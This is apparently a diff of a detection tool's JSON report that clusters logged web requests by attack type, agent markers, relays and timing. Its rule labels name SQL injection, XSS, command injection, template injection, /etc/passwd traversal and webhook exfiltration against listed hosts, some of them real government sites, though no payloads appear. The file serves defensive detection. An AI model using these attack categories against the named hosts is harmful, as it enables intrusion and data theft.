+      "runs": [
+        {
+          "start": 1773331200,
+          "end": 1773331440,
+          "count": 5
+        }
+      ],
+      "timing": {
+        "count": 5,
+        "start": 1773331200,
+        "end": 1773331440,
+        "median_gap_secs": 60.0,
+        "p90_gap_secs": 60.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1773331200,
+            5
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.016666666666666666,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 5
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 5,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C26",
+      "key": "k-4c8b6e8f",
+      "members": [
+        227,
+        228,
+        229
+      ],
+      "start": 1772719200,
+      "end": 1772719320,
+      "tier": "suggestive",
+      "score": 5,
+      "rules": {
+        "cache.buster": 3,
+        "marker.uq_tags": 3,
+        "relay.jina": 3
+      },
+      "kinds": {
+        "relay": 3,
+        "agent_marker": 3,
+        "cache_buster": 3
+      },
+      "tactics": {
+        "T1": 6
+      },
+      "artifacts": 3,
+      "target_hosts": {
+        "gist.github.com": 3
+      },
+      "asns": {
+        "16509": 3
+      },
+      "user_agents": {
+        "ScoutAgent/1.0": 3
+      },
+      "encodings": {},
+      "relay_stacks": {
+        "relay.jina → target": 3
+      },
+      "link_features": [
+        "param:uqtag=scout7f"
+      ],
+      "runs": [
+        {
+          "start": 1772719200,
+          "end": 1772719320,
+          "count": 3
+        }
+      ],
+      "timing": {
+        "count": 3,
+        "start": 1772719200,
+        "end": 1772719320,
+        "median_gap_secs": 60.0,
+        "p90_gap_secs": 60.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1772719200,
+            3
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.016666666666666666,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 3
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 3,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C27",
       "key": "k-323bd6db",
       "members": [
-        184,
-        186,
-        187
+        194,
+        196,
+        197
       ],
       "start": 1786266600,
       "end": 1786273500,
-      "tier": "significant",
-      "score": 11,
+      "tier": "suggestive",
+      "score": 5,
       "rules": {
         "header.gzip_only_requests": 1,
         "header.headless_ua": 2,
@@ -11279,897 +12936,7 @@
       }
     },
     {
-      "id": "C20",
-      "key": "k-3bed0073",
-      "members": [
-        107,
-        108
-      ],
-      "start": 1780408805,
-      "end": 1780408990,
-      "tier": "significant",
-      "score": 7,
-      "rules": {
-        "exploit.sqli_boolean": 1,
-        "marker.oai_tag": 1
-      },
-      "kinds": {
-        "exploit": 1,
-        "agent_marker": 1
-      },
-      "tactics": {
-        "T4": 1
-      },
-      "artifacts": 1,
-      "target_hosts": {
-        "civilrightsdata.ed.gov": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "sp20.unsorted.noslash": 1
-      },
-      "dialect": {
-        "variants": {
-          "sqli.numeric_or": 1
-        },
-        "records": 1,
-        "first_seen": [
-          "sqli.numeric_or"
-        ],
-        "signature": "23803591"
-      },
-      "fanout": {
-        "batches": 2,
-        "widths": {
-          "1": 2
-        },
-        "modal_share": 1.0
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1780408805,
-          "end": 1780408990,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1780408805,
-        "end": 1780408990,
-        "median_gap_secs": 185.0,
-        "p90_gap_secs": 185.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1780408800,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.05138888888888889,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "self_described",
-        "signals": [
-          {
-            "kind": "self_id",
-            "records": 1,
-            "detail": "marker.oai_tag"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C21",
-      "key": "k-a40c5369",
-      "members": [
-        69,
-        70
-      ],
-      "start": 1782987840,
-      "end": 1782987900,
-      "tier": "significant",
-      "score": 9,
-      "rules": {
-        "carrier.html_program": 1,
-        "exploit.xss": 1,
-        "marker.placeholder_identity": 2,
-        "relay.jina": 1
-      },
-      "kinds": {
-        "relay": 1,
-        "carrier": 1,
-        "exploit": 1,
-        "agent_marker": 2
-      },
-      "tactics": {
-        "T1": 1,
-        "T2": 1,
-        "T4": 1,
-        "T5": 2
-      },
-      "artifacts": 2,
-      "target_hosts": {
-        "records.agency.example": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "hexU.unsorted.noslash": 1
-      },
-      "dialect": {
-        "variants": {
-          "xss.script_alert": 1
-        },
-        "records": 1,
-        "first_seen": [
-          "xss.script_alert"
-        ],
-        "signature": "8380dc75"
-      },
-      "relay_stacks": {
-        "carrier.html_program → target": 1,
-        "relay.jina → target": 1
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1782987840,
-          "end": 1782987900,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1782987840,
-        "end": 1782987900,
-        "median_gap_secs": 60.0,
-        "p90_gap_secs": 60.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1782986400,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.016666666666666666,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "model_written",
-        "signals": [
-          {
-            "kind": "residue",
-            "records": 2,
-            "detail": "marker.placeholder_identity"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C22",
-      "key": "k-21e5a81d",
-      "members": [
-        160,
-        161
-      ],
-      "start": 1785747670,
-      "end": 1785747700,
-      "tier": "significant",
-      "score": 4,
-      "rules": {
-        "exploit.cmdi": 2
-      },
-      "kinds": {
-        "exploit": 2
-      },
-      "tactics": {
-        "T4": 2
-      },
-      "artifacts": 0,
-      "target_hosts": {
-        "records.agency.example": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {},
-      "dialect": {
-        "variants": {
-          "cmd.semicolon": 1,
-          "cmd.subshell": 1
-        },
-        "records": 2,
-        "first_seen": [
-          "cmd.semicolon",
-          "cmd.subshell"
-        ],
-        "signature": "c0942b1d"
-      },
-      "fanout": {
-        "batches": 2,
-        "widths": {
-          "1": 2
-        },
-        "modal_share": 1.0
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1785747670,
-          "end": 1785747700,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1785747670,
-        "end": 1785747700,
-        "median_gap_secs": 30.0,
-        "p90_gap_secs": 30.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1785747600,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.008333333333333333,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "payloads_only"
-      }
-    },
-    {
-      "id": "C23",
-      "key": "k-da54fae3",
-      "members": [
-        125,
-        126
-      ],
-      "start": 1785771060,
-      "end": 1785771120,
-      "tier": "significant",
-      "score": 13,
-      "rules": {
-        "exploit.ssti": 1,
-        "exploit.traversal": 1,
-        "exploit.traversal_single": 1
-      },
-      "kinds": {
-        "exploit": 3
-      },
-      "tactics": {
-        "T4": 3
-      },
-      "artifacts": 0,
-      "target_hosts": {
-        "api.datausa.io": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "hexU.sorted.noslash": 1
-      },
-      "dialect": {
-        "variants": {
-          "ssti.double_brace": 1,
-          "traversal.depth2": 1,
-          "traversal.etc_passwd": 1
-        },
-        "records": 2,
-        "first_seen": [
-          "ssti.double_brace",
-          "traversal.depth2",
-          "traversal.etc_passwd"
-        ],
-        "signature": "bf957942"
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1785771060,
-          "end": 1785771120,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1785771060,
-        "end": 1785771120,
-        "median_gap_secs": 60.0,
-        "p90_gap_secs": 60.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1785769200,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.016666666666666666,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "payloads_only",
-        "signals": [
-          {
-            "kind": "model_pace_chain",
-            "records": 3
-          }
-        ]
-      }
-    },
-    {
-      "id": "C24",
-      "key": "k-93ae0ac9",
-      "members": [
-        122,
-        123
-      ],
-      "start": 1786500600,
-      "end": 1786500840,
-      "tier": "significant",
-      "score": 13,
-      "rules": {
-        "carrier.html_program": 2,
-        "carrier.httpbin": 1,
-        "carrier.inline_fetch_program": 1,
-        "exploit.xss": 1,
-        "marker.title_write": 1
-      },
-      "kinds": {
-        "carrier": 4,
-        "exploit": 1,
-        "agent_marker": 1
-      },
-      "tactics": {
-        "T2": 4,
-        "T4": 1,
-        "T7": 1
-      },
-      "artifacts": 0,
-      "target_hosts": {
-        "vizprod.aihw.gov.au": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "hexU.unsorted.noslash": 1
-      },
-      "dialect": {
-        "variants": {
-          "xss.script_alert": 1
-        },
-        "records": 1,
-        "first_seen": [
-          "xss.script_alert"
-        ],
-        "signature": "8380dc75"
-      },
-      "relay_stacks": {
-        "carrier.html_program → target": 1,
-        "carrier.httpbin → carrier.html_program → carrier.inline_fetch_program → target": 1
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1786500600,
-          "end": 1786500840,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1786500600,
-        "end": 1786500840,
-        "median_gap_secs": 240.0,
-        "p90_gap_secs": 240.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1786500000,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.06666666666666667,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "payloads_only"
-      }
-    },
-    {
-      "id": "C25",
-      "key": "k-131d8ae5",
-      "members": [
-        39,
-        40
-      ],
-      "start": 1788357600,
-      "end": 1788357780,
-      "tier": "significant",
-      "score": 10,
-      "rules": {
-        "exploit.sqli_union": 2,
-        "marker.uq_tags": 2,
-        "relay.jina": 2
-      },
-      "kinds": {
-        "relay": 2,
-        "exploit": 2,
-        "agent_marker": 2
-      },
-      "tactics": {
-        "T1": 2,
-        "T4": 2
-      },
-      "artifacts": 2,
-      "target_hosts": {
-        "records.plant-a.example": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "sp20.sorted.noslash": 2
-      },
-      "dialect": {
-        "variants": {
-          "sqli.union_select": 2
-        },
-        "records": 2,
-        "first_seen": [
-          "sqli.union_select"
-        ],
-        "signature": "3da130c5"
-      },
-      "relay_stacks": {
-        "relay.jina → target": 2
-      },
-      "link_features": [
-        "param:uqtag=pl4nt1"
-      ],
-      "runs": [
-        {
-          "start": 1788357600,
-          "end": 1788357780,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1788357600,
-        "end": 1788357780,
-        "median_gap_secs": 180.0,
-        "p90_gap_secs": 180.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1788357600,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.05,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "self_described",
-        "signals": [
-          {
-            "kind": "self_id",
-            "records": 2,
-            "detail": "marker.uq_tags"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C26",
-      "key": "k-635475d7",
-      "members": [
-        42,
-        43
-      ],
-      "start": 1788426000,
-      "end": 1788426120,
-      "tier": "significant",
-      "score": 10,
-      "rules": {
-        "cache.buster": 2,
-        "exploit.traversal": 2,
-        "exploit.traversal_single": 2
-      },
-      "kinds": {
-        "exploit": 4,
-        "cache_buster": 2
-      },
-      "tactics": {
-        "T1": 2,
-        "T4": 4
-      },
-      "artifacts": 0,
-      "target_hosts": {
-        "api.plant-b.example": 2
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "hexU.unsorted.noslash": 2
-      },
-      "dialect": {
-        "variants": {
-          "traversal.depth4": 2,
-          "traversal.etc_passwd": 1
-        },
-        "records": 2,
-        "first_seen": [
-          "traversal.depth4",
-          "traversal.etc_passwd"
-        ],
-        "signature": "804cd67a"
-      },
-      "link_features": [
-        "param:run=pb7781"
-      ],
-      "runs": [
-        {
-          "start": 1788426000,
-          "end": 1788426120,
-          "count": 2
-        }
-      ],
-      "timing": {
-        "count": 2,
-        "start": 1788426000,
-        "end": 1788426120,
-        "median_gap_secs": 120.0,
-        "p90_gap_secs": 120.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1788426000,
-            2
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.03333333333333333,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 2
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "payloads_only"
-      }
-    },
-    {
-      "id": "C27",
+      "id": "C28",
       "key": "k-31edd96c",
       "members": [
         118,
@@ -12300,7 +13067,7 @@
       }
     },
     {
-      "id": "C28",
+      "id": "C29",
       "key": "k-9df8c89d",
       "members": [
         52,
@@ -12425,7 +13192,7 @@
       }
     },
     {
-      "id": "C29",
+      "id": "C30",
       "key": "k-6ac6b86f",
       "members": [
         66,
@@ -12434,7 +13201,7 @@
       "start": 1782987660,
       "end": 1782987780,
       "tier": "suggestive",
-      "score": 5,
+      "score": 4,
       "rules": {
         "cache.buster": 1,
         "marker.impossible_date": 2,
@@ -12546,11 +13313,11 @@
       }
     },
     {
-      "id": "C30",
+      "id": "C31",
       "key": "k-7714324d",
       "members": [
-        167,
-        168
+        177,
+        178
       ],
       "start": 1786024800,
       "end": 1786024830,
@@ -12658,11 +13425,11 @@
       }
     },
     {
-      "id": "C31",
+      "id": "C32",
       "key": "k-3cff30a9",
       "members": [
-        176,
-        177
+        186,
+        187
       ],
       "start": 1786093200,
       "end": 1786093260,
@@ -12764,11 +13531,11 @@
     }
   ],
   "timing": {
-    "count": 175,
+    "count": 191,
     "start": 1764320400,
     "end": 1788426240,
-    "median_gap_secs": 60.0,
-    "p90_gap_secs": 137107.0,
+    "median_gap_secs": 90.0,
+    "p90_gap_secs": 152880.0,
     "bursts": [
       {
         "start": 1778728800,
@@ -12798,16 +13565,6 @@
         "count": 0
       },
       {
-        "start": 1776187800,
-        "end": 1778508130,
-        "count": 0
-      },
-      {
-        "start": 1781161200,
-        "end": 1782986400,
-        "count": 0
-      },
-      {
         "start": 1784534700,
         "end": 1785747600,
         "count": 0
@@ -12818,8 +13575,18 @@
         "count": 0
       },
       {
-        "start": 1779303840,
-        "end": 1780308000,
+        "start": 1776187800,
+        "end": 1777287600,
+        "count": 0
+      },
+      {
+        "start": 1781949600,
+        "end": 1782922800,
+        "count": 0
+      },
+      {
+        "start": 1781161200,
+        "end": 1781949600,
         "count": 0
       },
       {
@@ -12833,6 +13600,21 @@
         "count": 0
       },
       {
+        "start": 1777287720,
+        "end": 1777881600,
+        "count": 0
+      },
+      {
+        "start": 1777968000,
+        "end": 1778508130,
+        "count": 0
+      },
+      {
+        "start": 1779786000,
+        "end": 1780308000,
+        "count": 0
+      },
+      {
         "start": 1783070940,
         "end": 1783508400,
         "count": 0
@@ -12840,6 +13622,11 @@
       {
         "start": 1784122800,
         "end": 1784534700,
+        "count": 0
+      },
+      {
+        "start": 1779303840,
+        "end": 1779699600,
         "count": 0
       },
       {
@@ -12858,11 +13645,6 @@
         "count": 0
       },
       {
-        "start": 1786280400,
-        "end": 1786500600,
-        "count": 0
-      },
-      {
         "start": 1772827286,
         "end": 1773046800,
         "count": 0
@@ -12870,21 +13652,6 @@
       {
         "start": 1785771120,
         "end": 1785924000,
-        "count": 0
-      },
-      {
-        "start": 1778745600,
-        "end": 1778882707,
-        "count": 0
-      },
-      {
-        "start": 1780912920,
-        "end": 1781020800,
-        "count": 0
-      },
-      {
-        "start": 1772720850,
-        "end": 1772827286,
         "count": 0
       }
     ],
@@ -27299,7 +28066,7 @@
       ],
       [
         1777287600,
-        0
+        2
       ],
       [
         1777291200,
@@ -27959,7 +28726,7 @@
       ],
       [
         1777881600,
-        0
+        1
       ],
       [
         1777885200,
@@ -28055,7 +28822,7 @@
       ],
       [
         1777968000,
-        0
+        1
       ],
       [
         1777971600,
@@ -28907,7 +29674,7 @@
       ],
       [
         1778734800,
-        0
+        1
       ],
       [
         1778738400,
@@ -29979,7 +30746,7 @@
       ],
       [
         1779699600,
-        0
+        1
       ],
       [
         1779703200,
@@ -30075,7 +30842,7 @@
       ],
       [
         1779786000,
-        0
+        1
       ],
       [
         1779789600,
@@ -31515,7 +32282,7 @@
       ],
       [
         1781082000,
-        3
+        4
       ],
       [
         1781085600,
@@ -32479,7 +33246,7 @@
       ],
       [
         1781949600,
-        0
+        1
       ],
       [
         1781953200,
@@ -33559,7 +34326,7 @@
       ],
       [
         1782921600,
-        0
+        1
       ],
       [
         1782925200,
@@ -37371,7 +38138,7 @@
       ],
       [
         1786352400,
-        0
+        6
       ],
       [
         1786356000,
@@ -39685,18 +40452,18 @@
         1,
         1,
         0,
-        0,
+        1,
         0,
         2,
-        3,
-        11,
-        9,
         5,
+        14,
+        10,
+        6,
         3,
         4,
         6,
         1,
-        4,
+        5,
         1,
         2,
         1,
@@ -39705,9 +40472,9 @@
         1,
         0
       ],
-      "entropy": 0.7867318290980416,
+      "entropy": 0.7849672103020154,
       "longest_idle_hours": 2257.0,
-      "days": 40,
+      "days": 48,
       "verdict": {
         "kind": "daytime",
         "utc_offset_guess": 0,
@@ -39890,15 +40657,16 @@
       "members": [
         110,
         111,
-        112
+        112,
+        162
       ],
       "varied": [
         "IdNumber"
       ],
-      "variants": 3,
-      "flagged": 3,
+      "variants": 4,
+      "flagged": 4,
       "start": 1781082720,
-      "end": 1781082810,
+      "end": 1781082870,
       "median_gap_secs": 50,
       "pace": "model",
       "retries_after_error": 0
@@ -39907,9 +40675,9 @@
       "host": "records.agency.example",
       "path": "/api/items",
       "members": [
-        154,
-        156,
-        157
+        164,
+        166,
+        167
       ],
       "varied": [
         "id"
@@ -39974,7 +40742,7 @@
       "start": 1778882707,
       "end": 1778882713,
       "clusters": [
-        "C3"
+        "C1"
       ]
     },
     {
@@ -39995,7 +40763,7 @@
       "start": 1778923800,
       "end": 1778923803,
       "clusters": [
-        "C9"
+        "C6"
       ]
     },
     {
@@ -40016,7 +40784,7 @@
       "start": 1782986700,
       "end": 1782987660,
       "clusters": [
-        "C29"
+        "C30"
       ]
     },
     {
@@ -40025,33 +40793,33 @@
       "steps": [
         {
           "route": "direct",
-          "record": 183,
+          "record": 193,
           "ts": 1786266000
         },
         {
           "route": "relay",
-          "record": 184,
+          "record": 194,
           "ts": 1786266600
         }
       ],
       "start": 1786266000,
       "end": 1786266600,
       "clusters": [
-        "C19"
+        "C27"
       ]
     }
   ],
   "soft_links": [
     {
-      "a": "C5",
-      "b": "C30",
+      "a": "C3",
+      "b": "C31",
       "kind": "callback_service",
       "strength": 0.3,
       "detail": "callback service: exfil.webhook_site"
     },
     {
-      "a": "C8",
-      "b": "C25",
+      "a": "C5",
+      "b": "C21",
       "kind": "encoding",
       "strength": 0.2,
       "detail": "encoding style: sp20.sorted.noslash"
@@ -40061,7 +40829,7 @@
     {
       "kind": "shared_sink",
       "a": {
-        "cluster": "C5",
+        "cluster": "C3",
         "key": "k-fd3d4fb8",
         "run": 1,
         "strand": "direct · Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/124.0 · AS16509",
@@ -40072,7 +40840,7 @@
         ]
       },
       "b": {
-        "cluster": "C5",
+        "cluster": "C3",
         "key": "k-fd3d4fb8",
         "run": 1,
         "strand": "relay.jina → target · python-httpx/0.27.0 · AS14061",
@@ -40088,7 +40856,7 @@
     {
       "kind": "handoff",
       "a": {
-        "cluster": "C13",
+        "cluster": "C26",
         "key": "k-4c8b6e8f",
         "run": 1,
         "records": [
@@ -40096,7 +40864,7 @@
         ]
       },
       "b": {
-        "cluster": "C14",
+        "cluster": "C11",
         "key": "k-74c086a9",
         "run": 1,
         "records": [
@@ -40109,7 +40877,7 @@
     {
       "kind": "role_sequence",
       "a": {
-        "cluster": "C7",
+        "cluster": "C25",
         "key": "k-408d9c03",
         "run": 1,
         "records": [
@@ -40119,7 +40887,7 @@
         ]
       },
       "b": {
-        "cluster": "C8",
+        "cluster": "C5",
         "key": "k-a798e7e7",
         "run": 1,
         "records": [
@@ -40135,7 +40903,7 @@
     {
       "kind": "disjoint_partition",
       "a": {
-        "cluster": "C1",
+        "cluster": "C23",
         "key": "k-b000dccb",
         "run": 1,
         "records": [
@@ -40145,7 +40913,7 @@
         ]
       },
       "b": {
-        "cluster": "C2",
+        "cluster": "C24",
         "key": "k-1d59194a",
         "run": 1,
         "records": [
